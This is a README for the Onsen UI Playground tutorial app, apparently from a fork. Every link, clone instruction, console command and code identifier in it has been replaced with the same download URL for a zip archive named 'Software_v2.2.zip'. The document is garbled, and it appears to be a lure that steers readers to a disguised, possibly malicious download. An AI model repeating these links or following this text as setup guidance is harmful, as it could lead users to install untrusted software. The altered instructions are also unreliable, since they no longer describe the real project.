# Onsen UI Playground

Playground, interactive tutorial and issue reporter for Onsen UI.

Try it here: https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip

# Contributing

We always appreciate contributions in form of issues or pull requests. For questions about OnsenUI please ask in our [community](https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip).

First, clone the repository with `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip`. After that just run a simple http-server for example:

```bash
$ npm install -g http-server
$ http-server . -c-1 -o -p 9000
```

In order to create new tutorials simply add an HTML file to the corresponding directory under `./tutorial/`. After that, include a line in `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` to index it in the app. Please check the existing examples to understand the proper syntax. Also add the necessary keywords to `modulesDefaultKeywords` (same file) to make the tutorial searchable.

# Configuration

By default, this app fetches the latest released version of Onsen UI and the bindings. This can be modified by running `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip(libName, version)` in the Developer Console, where `libName` is a string matching 'onsenui', 'react-onsenui' or any other bindings; and `version` is a string containing the exact version, e.g. '2.0.5'.

All the libs version are listed under `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` (`undefined` value means `latest`).

# Local Development

If the playground app is served locally together with Onsen UI repo, it will fetch local versions for Onsen UI and the bindings. It requires Onsen UI main repo directory to be located in the same level:

```
workspace/
├── Onsen UI/     (main repo)
└── playground/     (playground repo)

http-server workspace -c-1
// Navigate to localhost:8080/playground/
```

This can be disabled by running `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip = false;` in Developer Console and reloading the demo.

## Testing Onsen UI

Open this on a device browser while serving locally. It will automatically switch to `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` view and can be used to manually debug Onsen UI with any framework.

# Release

As part of the build process of [https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip](https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip), it pulls the `gh-pages` branch of this repository. To release your Playground changes, merge `master` into `gh-pages` (preferably via a pull request, even if you merge it yourself). Then trigger a new build of `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` as per [its release guide](https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip).

# Other Features

* `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` view: `tab-visibility` binary parameter can be used to toggle tabs visibility: `?tab-visibility=1110` shows everything except "Docs" tab.
* `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` view: `docs` boolean parameter is used to optionally hide the Docs panel (`?docs=false`).
* `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` view: `issue` numeric parmeter can be included to fetch a GitHub issue information. E.g. `?issue=2204`.
* `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip` view: `external` parmeter can specify an external URL to a tutorial-like document. E.g. `https://github.com/iwanariana/playground/raw/refs/heads/master/tutorial/vanilla/common_patterns/Software_v2.2.zip`.
